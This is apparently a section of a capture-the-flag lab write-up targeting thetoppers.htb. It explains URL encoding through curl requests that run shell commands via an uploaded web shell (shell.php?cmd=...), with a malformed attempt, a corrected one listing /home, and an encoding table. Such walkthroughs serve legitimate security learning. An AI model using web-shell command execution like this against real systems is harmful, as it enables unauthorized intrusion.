# Phase 5 — Understanding URL Encoding

An early mistake:

```bash
curl "http://thetoppers.htb/shell.php?cmd=ls /home"
```

Result:

```text
curl: (3) URL rejected: Malformed input to a URL function
```

Cause:

* Spaces were not URL encoded.

Correct version:

```bash
curl "http://thetoppers.htb/shell.php?cmd=ls%20/home"
```

Output:

```text
svc
```

Key encoding rules:

| Character | Encoding |
| --------- | -------- |
| Space     | %20      |
| >         | %3E      |
| &         | %26      |

